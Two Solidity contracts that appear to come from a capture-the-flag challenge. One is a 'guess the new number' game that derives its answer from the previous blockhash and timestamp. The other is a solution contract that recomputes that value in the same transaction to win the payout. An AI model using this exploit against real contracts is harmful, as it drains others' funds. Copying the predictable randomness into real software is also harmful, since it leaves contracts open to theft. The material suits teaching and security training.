pragma solidity ^0.4.21;
import './GuessTheNewNumberChallenge.sol';

contract Solution{
  function() public payable{}

  function solve(address _address) public payable{
    require(msg.value == 1 ether);

    GuessTheNewNumberChallenge cte = GuessTheNewNumberChallenge(_address);
    cte.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number-1), now)));
  }

  function destroy() public{
    selfdestruct(msg.sender);
  }
}

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

